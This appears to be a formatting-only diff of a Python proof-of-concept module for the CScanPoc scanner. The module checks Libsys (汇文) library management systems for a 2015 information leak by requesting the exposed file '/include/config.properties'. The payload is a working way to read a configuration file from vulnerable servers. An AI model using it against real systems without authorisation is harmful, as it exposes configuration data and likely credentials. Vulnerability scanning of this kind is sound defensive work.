@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import datetime
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Libsys_0011' # 平台漏洞编号，留空
+    vuln_id = 'Libsys_0011'  # 平台漏洞编号，留空
     name = '汇文图书管理系统 敏感信息泄露'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INFO_LEAK # 漏洞类型
+    type = VulnType.INFO_LEAK  # 漏洞类型
     disclosure_date = '2015-07-10'  # 漏洞公布时间
     desc = '''
         汇文（Libsys）图书管理系统敏感信息泄露。
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '汇文软件'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'ea2fa4ea-f5ef-48b3-a24a-634d1fd479c7'
@@ -32,8 +34,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #http://www.wooyun.org/bugs/wooyun-2010-0125785
+
+            # http://www.wooyun.org/bugs/wooyun-2010-0125785
             payload = '/include/config.properties'
             verify_url = self.target + payload
             r = requests.get(verify_url)
@@ -42,12 +44,12 @@ class Poc(ABPoc):
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
-
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
